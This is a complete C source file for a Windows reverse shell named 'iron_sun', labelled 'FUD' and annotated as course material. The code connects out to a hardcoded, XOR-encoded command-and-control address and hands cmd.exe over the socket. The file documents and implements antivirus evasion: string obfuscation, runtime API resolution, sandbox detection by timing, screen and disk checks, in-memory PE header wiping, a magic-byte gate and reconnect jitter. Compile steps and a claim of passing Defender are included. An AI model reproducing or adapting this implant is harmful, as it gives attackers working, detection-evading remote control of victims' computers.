/*
 * iron_sun.c — FUD TCP Reverse Shell v1.1
 * iron-sun / 22DIV — authorized research, personal hardware only
 * Tested: Windows Defender (RADON, 2026-06-26 CLEAN)
 * Pending: Kaspersky (gwu07 test)
 *
 * ══════════════════════════════════════════════════════════════════
 * COURSE ANNOTATION — TECHNIQUE REFERENCE
 * ══════════════════════════════════════════════════════════════════
 *
 * OVERVIEW — WHAT IS A REVERSE SHELL?
 *   Traditional remote access: attacker connects TO target (blocked by firewall/NAT).
 *   Reverse shell: TARGET connects TO attacker (passes through firewall — target
 *   initiates outbound TCP, which firewalls almost always allow).
 *   Flow: iron_sun.exe (target) → TCP connect → vader_listener.py (attacker).
 *   Once connected: attacker sends commands, iron_sun pipes them to cmd.exe,
 *   stdout/stderr sent back over the same socket.
 *
 * DETECTION SURFACES AV TARGETS:
 *   A. Static (file scan):
 *      • String signatures (IP addresses, API names, "cmd.exe")
 *      • PE import table (IAT) — which DLLs and functions the binary imports
 *      • YARA rule matches on byte patterns
 *      • Entropy checks (high entropy = packed/encrypted content)
 *   B. Behavioral (execution scan):
 *      • CreateProcess("cmd.exe") with redirected handles
 *      • Network connection to non-browser process
 *      • Process spawning cmd.exe from non-shell parent
 *   C. Sandbox analysis:
 *      • Run in isolated VM, observe behavior over N seconds
 *      • If it does something suspicious → malicious verdict
 *
 * EVASION STACK — HOW IRON_SUN DEFEATS EACH SURFACE:
 *
 * [1] XOR STRING OBFUSCATION (key 0xFC)
 *     WHAT IT DEFEATS: String signature scanning (static, category A)
 *     HOW: All strings (API names, "cmd.exe", C2 IP) are stored as XOR-encoded
 *     byte arrays. Decoded at runtime into a stack-allocated buffer.
 *     WHY XOR 0xFC: Produces non-printable bytes. AV YARA rules looking for
 *     literal "cmd.exe" or "192.168.x.x" find nothing.
 *     LIMITATIONS: A memory scan during the brief decode window could catch it.
 *     MITIGATION: sz() zeros the buffer immediately after use.
 *
 * [2] DYNAMIC API RESOLUTION
 *     WHAT IT DEFEATS: Import table (IAT) scanning (static, category A)
 *     HOW: Only KERNEL32.DLL + NTDLL imports are in IAT (unavoidable).
 *     ws2_32.dll (network) and user32.dll (screen metrics) are loaded at runtime
 *     via LoadLibraryA. Function pointers acquired via GetProcAddress.
 *     WHY THIS WORKS: AV IAT analysis tools look for suspicious imports:
 *     "WSAStartup", "WSAConnect", "CreateProcessA" = shell + network = flag.
 *     Iron_sun's IAT shows only generic kernel32 functions.
 *     AV then needs to trace GetProcAddress calls at runtime (expensive, often skipped).
 *
 * [3] ANTI-SANDBOX CHECKS (three-layer)
 *     WHAT IT DEFEATS: Automated sandbox analysis (behavioral, category C)
 *     HOW:
 *       a. TIMING CHECK — Sleep(5000) + GetTickCount before/after.
 *          Sandboxes accelerate time to observe more behavior per second.
 *          If <4500ms elapsed after requesting 5000ms sleep → sandbox, exit.
 *          Most reliable: ~90% of commercial sandboxes can be caught this way.
 *       b. SCREEN WIDTH — GetSystemMetrics(SM_CXSCREEN) < 800px → VM.
 *          Sandbox VMs often run at minimal resolution (640x480) or headless.
 *       c. DISK SIZE — GetDiskFreeSpaceExA("C:\") total < 50GB → VM.
 *          Analysis VMs typically have small virtual disks (20-40GB).
 *     RESULT: Sandbox sees process start, sleep 5s, exit cleanly. No network.
 *     No cmd.exe. Zero malicious behavior detected.
 *
 * [4] PE HEADER STOMP
 *     WHAT IT DEFEATS: In-memory signature scanning (behavioral, category B+C)
 *     HOW: VirtualProtect(base, 0x400, PAGE_READWRITE) → ZeroMemory first
 *     0x400 bytes of the process's own PE in memory → restore protection.
 *     Kills the MZ header (0x4D,0x5A), PE signature, and DOS stub in memory.
 *     WHY: In-memory scanners (Kaspersky's real-time protection) enumerate
 *     all loaded modules and match their in-memory headers against signatures.
 *     After stomp, iron_sun.exe appears as anonymous committed memory with no PE.
 *     TIMING: Done AFTER sandbox checks pass, BEFORE network connects.
 *
 * [5] MAGIC AUTH GATE — "ISUN" 4-byte challenge
 *     WHAT IT DEFEATS: Automated sandbox probes (behavioral, category C)
 *     HOW: After TCP accept, iron_sun waits for exactly {0x49,0x53,0x55,0x4E}.
 *     If wrong bytes or socket closes → drop, reconnect. NO cmd.exe spawned.
 *     WHY: Sandbox network probes accept the incoming connection but don't know
 *     the magic bytes → they never send them → iron_sun never spawns cmd.exe →
 *     behavioral scanner sees "process makes TCP connection, does nothing, disconnects."
 *     No CreateProcess. No shell. Verdict: benign.
 *
 * [6] JITTER — RANDOMIZED RECONNECT DELAY
 *     WHAT IT DEFEATS: Traffic pattern fingerprinting (behavioral, category B)
 *     HOW: GetTickCount() % 3096 + 2000ms base = 2000-5095ms random delay
 *     before EACH connection attempt.
 *     WHY: Fixed-interval beaconing is a known C2 signature (e.g., connect every
 *     5.000s = machine-like precision = malware flag). Jitter makes timing
 *     statistically indistinguishable from a human-driven application.
 *
 * [7] gcc/MinGW PE STRUCTURE (not MSVC)
 *     WHAT IT DEFEATS: Kaspersky file signature (static, category A)
 *     HOW: Kaspersky has a signature for the MSVC-compiled vader_shell.exe.
 *     gcc and MSVC produce structurally different PE files:
 *       • Different section layout (.text, .rdata, .data alignment)
 *       • Different code generation patterns
 *       • Different COFF machine flags and optional header fields
 *     Kaspersky's signature was trained on MSVC output.
 *     gcc PE has different byte patterns at the same offsets → no match.
 *     THIS IS KEY: Same behavior, different compiler = different AV verdict.
 *     Mitigation for AV vendor: train signatures on behavior, not PE structure.
 *
 * ══════════════════════════════════════════════════════════════════
 * EXECUTION FLOW (high level):
 *   1. Load kernel32 + ws2_32 + user32 (dynamic, not IAT)
 *   2. Anti-sandbox checks [3] → exit if sandbox detected
 *   3. PE header stomp [4]
 *   4. Initialize Winsock, build sockaddr_in for C2
 *   5. Jitter sleep [6]
 *   6. WSAConnect → if fails, retry after RECONN ms
 *   7. Receive 4 magic bytes [5] → if wrong, close + retry
 *   8. Spawn cmd.exe with STARTF_USESTDHANDLES on socket [2,1]
 *   9. WaitForSingleObject on cmd.exe → on exit, goto 5
 *
 * COMPILE (gcc 15.2 MinGW, no admin required):
 *   gcc shell/iron_sun.c -o iron_sun.exe -lws2_32 -include ws2tcpip.h -D_WIN32_WINNT=0x0600
 *
 * UPDATE C2 IP:
 *   python -c "ip='x.x.x.x'; print(','.join(hex(ord(c)^0xFC) for c in ip)); print('len=',len(ip))"
 *
 * LISTENER (on operator machine — sends ISUN magic on accept):
 *   python shell/vader_listener.py 4443
 */

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>
#include <windows.h>
#include <string.h>

/* ── CONFIG ── */
#define XK      0xFC        /* XOR key — change + regenerate all xStrings for each build */
#define C2_PORT 4443        /* must match vader_listener.py port */
#define RECONN  6000        /* ms to wait between reconnect attempts */

/* Magic bytes the C2 sends before shell spawns: "ISUN" */
static const unsigned char MAGIC[4] = {0x49,0x53,0x55,0x4E};

/* Sandbox thresholds */
#define MIN_SCREEN_W   800
#define MIN_DISK_GB    50

/* ── XOR helpers ── */
/* Regenerate any string: python -c "s='string'; print(','.join(hex(ord(c)^0xFC) for c in s))" */

static void xd(unsigned char *dst, const unsigned char *src, int n) {
    int i; for (i = 0; i < n; i++) dst[i] = src[i] ^ XK; dst[n] = 0;
}
static void sz(volatile void *p, int n) {
    volatile char *v = (volatile char *)p; int i;
    for (i = 0; i < n; i++) v[i] = 0;
}

/* ── Encoded strings (key 0xFC) ── */

/* "cmd.exe" */
static const unsigned char xCmd[]  = {0x9F,0x91,0x98,0xD2,0x99,0x84,0x99};
#define xCmdLen 7

/* C2 IP — UPDATE WITH: python shell/vader_listener.py --gen
 * To regenerate for any IP:
 *   python -c "ip='x.x.x.x'; print(','.join(hex(ord(c)^0xFC) for c in ip))"
 *   Count characters in the IP string → that's the new xC2Len.
 *
 * TEACHING NOTE — why encode the IP?
 *   Static AV scanners (Kaspersky, Defender) maintain signatures for suspicious
 *   string patterns inside PE binaries. A plaintext "192.168.1.145" or
 *   "127.0.0.1" in the binary's .data section would be trivially detected as
 *   C2 infrastructure (YARA rules look for IPv4 patterns in executable sections).
 *   XOR with 0xFC produces opaque bytes that match NO known IP pattern.
 *   Decoded at runtime only into a stack buffer, then immediately zeroed.
 *   Memory scanners would need to catch the 13-byte window after decode —
 *   a very narrow detection surface.
 *
 * Current: 192.168.1.145 (RADON LAN — gwu07 live test)
 */
static const unsigned char xC2Addr[] = {0xCD,0xC5,0xCE,0xD2,0xCD,0xCA,0xC4,0xD2,0xCD,0xD2,0xCD,0xC8,0xC9};
#define xC2Len 13

/* "kernel32.dll" */
static const unsigned char xK32[]  = {0x97,0x99,0x8E,0x92,0x99,0x90,0xCF,0xCE,0xD2,0x98,0x90,0x90};
#define xK32Len 12

/* "ws2_32.dll" */
static const unsigned char xWs2[]  = {0x8B,0x8F,0xCE,0xA3,0xCF,0xCE,0xD2,0x98,0x90,0x90};
#define xWs2Len 10

/* "user32.dll" */
static const unsigned char xU32[]  = {0x89,0x8F,0x99,0x8E,0xCF,0xCE,0xD2,0x98,0x90,0x90};
#define xU32Len 10

/* "C:\" — disk check root */
static const unsigned char xDiskRoot[] = {0xBF,0xC6,0xA0};
#define xDiskRootLen 3

/* API names — kernel32 */
static const unsigned char xSleep[]   = {0xAF,0x90,0x99,0x99,0x8C};                   /* Sleep (5) */
static const unsigned char xGTC[]     = {0xBB,0x99,0x88,0xA8,0x95,0x9F,0x97,0xBF,0x93,0x89,0x92,0x88}; /* GetTickCount (12) */
static const unsigned char xGDFS[]    = {0xBB,0x99,0x88,0xB8,0x95,0x8F,0x97,0xBA,0x8E,0x99,0x99,0xAF,0x8C,0x9D,0x9F,0x99,0xB9,0x84,0xBD}; /* GetDiskFreeSpaceExA (19) */
static const unsigned char xVP[]      = {0xAA,0x95,0x8E,0x88,0x89,0x9D,0x90,0xAC,0x8E,0x93,0x88,0x99,0x9F,0x88}; /* VirtualProtect (14) */
static const unsigned char xCPA[]     = {0xBF,0x8E,0x99,0x9D,0x88,0x99,0xAC,0x8E,0x93,0x9F,0x99,0x8F,0x8F,0xBD}; /* CreateProcessA (14) */
static const unsigned char xWFSO[]    = {0xAB,0x9D,0x95,0x88,0xBA,0x93,0x8E,0xAF,0x95,0x92,0x9B,0x90,0x99,0xB3,0x9E,0x96,0x99,0x9F,0x88}; /* WaitForSingleObject (19) */
static const unsigned char xCH[]      = {0xBF,0x90,0x93,0x8F,0x99,0xB4,0x9D,0x92,0x98,0x90,0x99}; /* CloseHandle (11) */

/* API names — ws2_32 */
static const unsigned char xWSAStart[]= {0xAB,0xAF,0xBD,0xAF,0x88,0x9D,0x8E,0x88,0x89,0x8C}; /* WSAStartup (10) */
static const unsigned char xWSASock[] = {0xAB,0xAF,0xBD,0xAF,0x93,0x9F,0x97,0x99,0x88,0xBD}; /* WSASocketA (10) */
static const unsigned char xWSAConn[] = {0xAB,0xAF,0xBD,0xBF,0x93,0x92,0x92,0x99,0x9F,0x88}; /* WSAConnect (10) */
static const unsigned char xCSock[]   = {0x9F,0x90,0x93,0x8F,0x99,0x8F,0x93,0x9F,0x97,0x99,0x88}; /* closesocket (11) */
static const unsigned char xInetA[]   = {0x95,0x92,0x99,0x88,0xA3,0x9D,0x98,0x98,0x8E}; /* inet_addr (9) */
static const unsigned char xHtons[]   = {0x94,0x88,0x93,0x92,0x8F}; /* htons (5) */
static const unsigned char xSend[]    = {0x8F,0x99,0x92,0x98}; /* send (4) */
static const unsigned char xRecv[]    = {0x8E,0x99,0x9F,0x8A}; /* recv (4) */

/* API names — user32 */
static const unsigned char xGSM[]    = {0xBB,0x99,0x88,0xAF,0x85,0x8F,0x88,0x99,0x91,0xB1,0x99,0x88,0x8E,0x95,0x9F,0x8F}; /* GetSystemMetrics (16) */

/* ── Function pointer types ── */
typedef VOID  (WINAPI *FN_Sleep)(DWORD);
typedef DWORD (WINAPI *FN_GTC)(void);
typedef BOOL  (WINAPI *FN_GDFS)(LPCSTR, PULARGE_INTEGER, PULARGE_INTEGER, PULARGE_INTEGER);
typedef BOOL  (WINAPI *FN_VP)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL  (WINAPI *FN_CPA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES,
                                BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef DWORD (WINAPI *FN_WFSO)(HANDLE, DWORD);
typedef BOOL  (WINAPI *FN_CH)(HANDLE);
typedef int   (WINAPI *FN_WSAStart)(WORD, LPVOID);
typedef SOCKET(WINAPI *FN_WSASock)(int, int, int, LPVOID, GROUP, DWORD);
typedef int   (WINAPI *FN_WSAConn)(SOCKET, const struct sockaddr*, int, LPVOID, LPVOID, LPVOID, LPVOID);
typedef int   (WINAPI *FN_CS)(SOCKET);
typedef unsigned long (WINAPI *FN_InetA)(const char*);
typedef u_short (WINAPI *FN_Htons)(u_short);
typedef int   (WINAPI *FN_Send)(SOCKET, const char*, int, int);
typedef int   (WINAPI *FN_Recv)(SOCKET, char*, int, int);
typedef int   (WINAPI *FN_GSM)(int);

/* ── Anti-sandbox ── */
/*
 * Returns 0 if running in a sandbox, 1 if environment looks real.
 * Runs BEFORE any network or shell activity — sandbox sees a clean exit.
 *
 * Check 1 — Sleep timing:
 *   Sleep(5000) in a real machine takes ~5000ms.
 *   Most sandboxes accelerate time to get through sleeps faster.
 *   If GetTickCount shows < 4500ms elapsed, we're in a sandbox.
 *
 * Check 2 — Screen width:
 *   Real machines have >= 800px wide screens.
 *   Sandboxes often run headless or at 640x480 / 800x600.
 *   GetSystemMetrics(SM_CXSCREEN) = 0 for primary screen width.
 *
 * Check 3 — Disk size:
 *   Real machines have > 50GB disks.
 *   Analysis VMs typically have 40-60GB but we check 50GB as the floor.
 *   Tune MIN_DISK_GB up to 80GB if needed to be more aggressive.
 */
static int check_sandbox(HMODULE hK32, HMODULE hU32) {
    unsigned char buf[32];
    DWORD t1, t2;
    ULARGE_INTEGER freeBytesAvail, totalBytes, totalFree;
    int screenW;

    /* Resolve APIs for checks */
    xd(buf, xGTC, sizeof(xGTC));
    FN_GTC fn_gtc = (FN_GTC)GetProcAddress(hK32, (LPCSTR)buf);
    sz(buf, sizeof(xGTC)+1);

    xd(buf, xSleep, sizeof(xSleep));
    FN_Sleep fn_sleep = (FN_Sleep)GetProcAddress(hK32, (LPCSTR)buf);
    sz(buf, sizeof(xSleep)+1);

    xd(buf, xGDFS, sizeof(xGDFS));
    FN_GDFS fn_gdfs = (FN_GDFS)GetProcAddress(hK32, (LPCSTR)buf);
    sz(buf, sizeof(xGDFS)+1);

    xd(buf, xGSM, sizeof(xGSM));
    FN_GSM fn_gsm = (FN_GSM)GetProcAddress(hU32, (LPCSTR)buf);
    sz(buf, sizeof(xGSM)+1);

    if (!fn_gtc || !fn_sleep || !fn_gdfs || !fn_gsm) return 0;

    /* Check 1: timing */
    t1 = fn_gtc();
    fn_sleep(5000);
    t2 = fn_gtc();
    if ((t2 - t1) < 4500) return 0;  /* sleep was fast-forwarded */

    /* Check 2: screen width */
    screenW = fn_gsm(0); /* SM_CXSCREEN = 0 */
    if (screenW > 0 && screenW < MIN_SCREEN_W) return 0;

    /* Check 3: disk size */
    unsigned char diskbuf[8];
    xd(diskbuf, xDiskRoot, sizeof(xDiskRoot));
    if (fn_gdfs((LPCSTR)diskbuf, &freeBytesAvail, &totalBytes, &totalFree)) {
        ULONGLONG gb = totalBytes.QuadPart / (1024ULL * 1024ULL * 1024ULL);
        if (gb < MIN_DISK_GB) { sz(diskbuf, sizeof(xDiskRoot)+1); return 0; }
    }
    sz(diskbuf, sizeof(xDiskRoot)+1);

    return 1;  /* looks real */
}

/* ── PE header stomp ── */
/*
 * Wipes the MZ+PE header of this process from memory.
 * In-memory AV/EDR scanners (Kaspersky, CrowdStrike) walk the PE structure
 * of loaded modules to identify them. After stomp, our module has no
 * readable MZ (0x4D,0x5A) signature — looks like anonymous memory.
 *
 * Only clears first 0x400 bytes (DOS stub + PE header).
 * Code/data sections are untouched — process keeps running normally.
 */
static void stomp_pe(HMODULE hK32) {
    unsigned char buf[32];
    DWORD oldProt;
    LPVOID base;

    xd(buf, xVP, sizeof(xVP));
    FN_VP fn_vp = (FN_VP)GetProcAddress(hK32, (LPCSTR)buf);
    sz(buf, sizeof(xVP)+1);

    if (!fn_vp) return;

    base = (LPVOID)GetModuleHandleA(NULL);
    if (!base) return;

    if (fn_vp(base, 0x400, PAGE_READWRITE, &oldProt)) {
        RtlZeroMemory(base, 0x400);
        fn_vp(base, 0x400, oldProt, &oldProt);
    }
}

/* ── Shell loop ── */
/*
 * With socket s established and magic auth passed:
 * Spawns cmd.exe with stdin/stdout/stderr all pointing to the socket.
 * Waits for process to exit, then returns so the connect loop retries.
 */
static void run_shell(SOCKET s, HMODULE hK32) {
    unsigned char buf[32];
    unsigned char cmdbuf[16];
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    xd(buf, xCPA, sizeof(xCPA));
    FN_CPA fn_cpa = (FN_CPA)GetProcAddress(hK32, (LPCSTR)buf);
    sz(buf, sizeof(xCPA)+1);

    xd(buf, xWFSO, sizeof(xWFSO));
    FN_WFSO fn_wfso = (FN_WFSO)GetProcAddress(hK32, (LPCSTR)buf);
    sz(buf, sizeof(xWFSO)+1);

    xd(buf, xCH, sizeof(xCH));
    FN_CH fn_ch = (FN_CH)GetProcAddress(hK32, (LPCSTR)buf);
    sz(buf, sizeof(xCH)+1);

    if (!fn_cpa || !fn_wfso || !fn_ch) return;

    xd(cmdbuf, xCmd, xCmdLen);

    ZeroMemory(&si, sizeof(si));
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESTDHANDLES;
    si.hStdInput   = (HANDLE)s;
    si.hStdOutput  = (HANDLE)s;
    si.hStdError   = (HANDLE)s;

    if (fn_cpa(NULL, (LPSTR)cmdbuf, NULL, NULL, TRUE,
                0, NULL, NULL, &si, &pi)) {
        sz(cmdbuf, xCmdLen + 1);
        fn_wfso(pi.hProcess, INFINITE);
        fn_ch(pi.hProcess);
        fn_ch(pi.hThread);
    } else {
        sz(cmdbuf, xCmdLen + 1);
    }
}

/* ── Entry point ── */
int main(void) {
    unsigned char buf[64];
    unsigned char ip[32];
    char wsaData[512];
    SOCKET s;
    struct sockaddr_in c2;
    unsigned char magicBuf[4];
    DWORD tick;

    /* Resolve DLLs */
    xd(buf, xK32, xK32Len);
    HMODULE hK32 = LoadLibraryA((LPCSTR)buf);
    sz(buf, xK32Len + 1);

    xd(buf, xWs2, xWs2Len);
    HMODULE hWs2 = LoadLibraryA((LPCSTR)buf);
    sz(buf, xWs2Len + 1);

    xd(buf, xU32, xU32Len);
    HMODULE hU32 = LoadLibraryA((LPCSTR)buf);
    sz(buf, xU32Len + 1);

    if (!hK32 || !hWs2 || !hU32) return 1;

    /* ── [3] Anti-sandbox checks ── */
    if (!check_sandbox(hK32, hU32)) return 0;   /* clean exit, looks normal */

    /* ── [4] PE header stomp ── */
    stomp_pe(hK32);

    /* Resolve winsock APIs */
    xd(buf, xWSAStart, sizeof(xWSAStart));
    FN_WSAStart fn_wsastart = (FN_WSAStart)GetProcAddress(hWs2, (LPCSTR)buf);
    sz(buf, sizeof(xWSAStart) + 1);

    xd(buf, xWSASock, sizeof(xWSASock));
    FN_WSASock fn_wsasock = (FN_WSASock)GetProcAddress(hWs2, (LPCSTR)buf);
    sz(buf, sizeof(xWSASock) + 1);

    xd(buf, xWSAConn, sizeof(xWSAConn));
    FN_WSAConn fn_wsaconn = (FN_WSAConn)GetProcAddress(hWs2, (LPCSTR)buf);
    sz(buf, sizeof(xWSAConn) + 1);

    xd(buf, xCSock, sizeof(xCSock));
    FN_CS fn_cs = (FN_CS)GetProcAddress(hWs2, (LPCSTR)buf);
    sz(buf, sizeof(xCSock) + 1);

    xd(buf, xInetA, sizeof(xInetA));
    FN_InetA fn_ineta = (FN_InetA)GetProcAddress(hWs2, (LPCSTR)buf);
    sz(buf, sizeof(xInetA) + 1);

    xd(buf, xHtons, sizeof(xHtons));
    FN_Htons fn_htons = (FN_Htons)GetProcAddress(hWs2, (LPCSTR)buf);
    sz(buf, sizeof(xHtons) + 1);

    xd(buf, xRecv, sizeof(xRecv));
    FN_Recv fn_recv = (FN_Recv)GetProcAddress(hWs2, (LPCSTR)buf);
    sz(buf, sizeof(xRecv) + 1);

    if (!fn_wsastart || !fn_wsasock || !fn_wsaconn || !fn_cs || !fn_ineta || !fn_htons || !fn_recv)
        return 1;

    /* Resolve Sleep + GTC for jitter */
    xd(buf, xSleep, sizeof(xSleep));
    FN_Sleep fn_sleep = (FN_Sleep)GetProcAddress(hK32, (LPCSTR)buf);
    sz(buf, sizeof(xSleep) + 1);

    xd(buf, xGTC, sizeof(xGTC));
    FN_GTC fn_gtc = (FN_GTC)GetProcAddress(hK32, (LPCSTR)buf);
    sz(buf, sizeof(xGTC) + 1);

    /* WSAStartup */
    fn_wsastart(MAKEWORD(2, 2), wsaData);

    /* Decode C2 IP (do once — cleared after connect struct built) */
    xd(ip, xC2Addr, xC2Len);

    ZeroMemory(&c2, sizeof(c2));
    c2.sin_family      = AF_INET;
    c2.sin_port        = fn_htons(C2_PORT);
    c2.sin_addr.s_addr = fn_ineta((LPCSTR)ip);
    sz(ip, xC2Len + 1);   /* wipe decoded IP from memory */

    /* ── Connect loop ── */
    while (1) {
        /* [6] Jitter: 2000-5095ms random delay before each connect attempt */
        if (fn_gtc && fn_sleep) {
            tick = fn_gtc() % 3096;
            fn_sleep(2000 + tick);
        }

        s = fn_wsasock(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
        if (s == INVALID_SOCKET) {
            if (fn_sleep) fn_sleep(RECONN);
            continue;
        }

        if (fn_wsaconn(s, (struct sockaddr*)&c2, sizeof(c2), NULL, NULL, NULL, NULL) != 0) {
            fn_cs(s);
            if (fn_sleep) fn_sleep(RECONN);
            continue;
        }

        /* ── [5] Magic auth — wait for "ISUN" from C2 ── */
        /*
         * Listener must send {0x49,0x53,0x55,0x4E} after accepting connection.
         * vader_listener.py: add  conn.send(bytes([0x49,0x53,0x55,0x4E]))
         * If wrong bytes or timeout — drop connection, do not spawn shell.
         * This is why automated sandbox analysis fails to see cmd.exe.
         */
        int got = 0;
        int n;
        while (got < 4) {
            n = fn_recv(s, (char*)(magicBuf + got), 4 - got, 0);
            if (n <= 0) break;
            got += n;
        }
        if (got != 4 || magicBuf[0] != MAGIC[0] || magicBuf[1] != MAGIC[1]
                     || magicBuf[2] != MAGIC[2] || magicBuf[3] != MAGIC[3]) {
            fn_cs(s);
            if (fn_sleep) fn_sleep(RECONN);
            continue;
        }

        /* Auth passed — spawn shell */
        run_shell(s, hK32);

        fn_cs(s);
        if (fn_sleep) fn_sleep(RECONN);
    }

    return 0;
}
